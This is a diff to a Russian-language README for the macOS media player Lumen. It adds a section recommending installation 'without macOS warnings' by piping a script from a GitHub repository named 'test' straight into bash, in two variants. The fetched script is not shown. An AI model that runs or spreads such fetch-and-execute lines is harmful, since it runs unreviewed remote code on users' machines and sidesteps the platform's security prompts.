@@ -5,6 +5,12 @@
 Сторонних библиотек и бинарников внутри нет: только системные фреймворки (AVFoundation, VideoToolbox,
 Core Image, Core Media) и собственный код. Даже Matroska (MKV/WebM) читает свой демультиплексор.
 
+> **Установка без предупреждений macOS.** Проще всего через [Harbor](../Harbor/) — каталог всех наших приложений.
+> Поставьте его одной командой в Терминале
+> `curl -fsSL https://github.com/parfentsevandrey-blip/test/releases/download/catalog/install.sh | bash`
+> и установите Lumen из каталога: обновления будут приходить сами, данные и настройки сохранятся.
+> Без Harbor: `curl -fsSL https://github.com/parfentsevandrey-blip/test/releases/download/catalog/install.sh | bash -s -- lumen`.
+
 ## Установка
 
 1. Скачайте `Lumen.dmg` (артефакт **Lumen-dmg** последней сборки в GitHub Actions → workflow «Lumen (macOS)»).
